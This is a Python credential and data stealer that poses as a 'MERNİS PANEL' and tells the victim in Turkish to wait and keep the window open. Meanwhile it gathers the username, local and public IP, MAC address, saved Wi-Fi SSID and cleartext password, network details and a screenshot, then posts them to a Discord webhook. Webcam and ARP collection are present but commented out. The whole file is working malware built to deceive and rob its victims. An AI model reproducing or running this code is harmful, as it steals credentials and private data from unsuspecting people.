import socket
import os
import requests
from PIL import ImageGrab
from io import BytesIO
import subprocess
import uuid
import cv2
from colorama import Style, Fore


banner = f"""
{Fore.RED}___________________________________________________________________________
  ________  ______  _________    _________
 /_  __/ / / / __ \/ ____/   |  /  _/ ___/
  / / / / / / /_/ / /   / /| |  / / \__ \ 
 / / / /_/ / _, _/ /___/ ___ |_/ / ___/ / 
/_/  \____/_/ |_|\____/_/  |_/___//____/  
                                          
-----------------------------------------------------------------------------
MERNİS PANEL 10 SANİYE SONRA AÇILACAKTIR LÜTFEN BU PENCEREYİ KAPATMAYINIZ....
-----------------------------------------------------------------------------
{Style.RESET_ALL}
"""
print(banner)

print(f"{Fore.RED}{Style.RESET_ALL}")

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

admin_user = os.popen('whoami').read().split('\\')[-1].strip()

ip = requests.get('https://api64.ipify.org').text

mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

modem_name = subprocess.run('netsh wlan show interfaces | findstr /r "^....SSID"', capture_output=True, text=True, shell=True).stdout.strip().split(':')[1].strip()

network_name = os.popen("netsh wlan show interfaces").read()

modem_password = subprocess.run('netsh wlan show profile name="' + modem_name + '" key=clear | findstr /r "Key Content"', capture_output=True, text=True, shell=True).stdout.strip().split(':')[1].strip()

screenshot = ImageGrab.grab()

#cap = cv2.VideoCapture(0)

'''ret, frame = cap.read()
if ret:
    _, img_encoded = cv2.imencode(".png", frame)
    webcam_bytes = img_encoded.tobytes()
else:
    webcam_bytes = None
'''
buffered = BytesIO()
screenshot.save(buffered, format="PNG")
screenshot_bytes = buffered.getvalue()

connected_devices = subprocess.check_output(['arp', '-a']).decode('utf-8')

webhook_url = 'UR Discord Webhook URL'


data = {
    "content": f"modem IP Adresi: {ip_address}\nadmin kullanici: {admin_user}\nWifi şifresi: {modem_password}\nWifi adı: {modem_name}\nİP adresi: {ip}\nbilgisayar mac adresi: {mac}\nWifi bilgileri: {network_name}\n" #Wifiye bağli cihazlar: {connected_devices}
}
files = {
    "screenshot.png": screenshot_bytes,
    #"webcam.png": webcam_bytes if webcam_bytes else b""
}
response = requests.post(webhook_url, data=data, files=files)

if response.status_code == 204:
    print("İstek başariyla gönderildi.")
else:
    print("İstek gönderilirken bir hata oluştu.")
